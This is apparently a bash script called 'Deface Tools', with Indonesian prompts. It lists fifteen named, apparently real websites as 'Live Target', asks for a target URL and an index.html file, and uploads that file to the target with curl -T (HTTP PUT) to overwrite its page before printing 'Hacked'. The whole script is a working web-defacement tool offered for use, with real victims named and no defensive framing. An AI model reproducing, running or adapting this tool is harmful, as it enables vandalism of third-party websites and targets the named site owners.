#!/bin/bash
# Deface Tools By RzzReo
# IG : _RzzReo_
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo "$red _____________________________"
echo "$green ---- Deface Tools By RzzReo ----"
echo "$red –––––––––––––––––––––––––"
echo $yellow "Live Target"
echo $white "http://contsol.co.za"
echo $cyan "http://colourfactory.co.za"
echo $white "http://chillibitez.co.za"
echo $cyan "http://chasingfantasia.com"
echo $white "http://centraltech.co.za"
echo $cyan "http://cblandscapes.co.za"
echo $white "http://crimsonmonkeyweb.com"
echo $cyan "http://kevinbutho.com"
echo $white "http://prorepafrica.com"
echo $cyan "http://xposurephotography.co.za"
echo $white "http://windmillsandporcupines.co.za"
echo $cyan "http://tcnig.co.za"
echo $white "http://techdirect.co.za"
echo $cyan "http://thehellenic.co.za"
echo $white "http://valdicare.co.za"
echo "$yellow Masukkan Target : "
read -p " ╰─$ "  Target
sleep 1
echo "$red SC Harus Disimpan Di Luar Folder (index.html)"
echo  "$purple Masukkan File (Harus Index.html) : "
read -p " ╰─$ "  File
sleep 1
echo Sedang Deface.
clear
sleep 2
echo Sedang Deface..
clear
sleep 2
echo Sedang Deface...
clear
sleep 2
curl -T /storage/emulated/0/$File $Target
echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
